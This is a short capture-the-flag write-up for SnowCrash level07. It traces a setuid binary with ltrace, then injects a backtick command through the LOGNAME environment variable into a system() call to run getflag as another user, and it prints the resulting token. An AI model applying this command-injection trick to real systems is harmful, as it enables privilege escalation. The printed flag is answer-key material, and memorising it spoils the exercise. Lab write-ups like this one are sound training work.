# LEVEL 07

# explanation 

in this level we are going to find the bug using env variables 

in the home page there is a file with suid/guid permessions


```
llevel07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

using ltrace we see 

level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7b4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                            = 2007
geteuid()                            = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
getenv("LOGNAME")                    = "level07"
asprintf(0xbffff704, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280) = 20
system("/bin/echo "level07 "Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )               = 0
+++ exited (status 0) +++

there is a LOGNAME  variable we will try to change into something and see what is going to happen 

    level07@SnowCrash:~$ export LOGNAME="hllo"
    level07@SnowCrash:~$ ./level07
    hllo

it appear that we can change it into a command and deduce the system call to /bin/echo 
by changing the value we can trick the program since the file can run any program as user flag07

# this is the token 

level07@SnowCrash:~$ export LOGNAME='`getflag`'
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h




















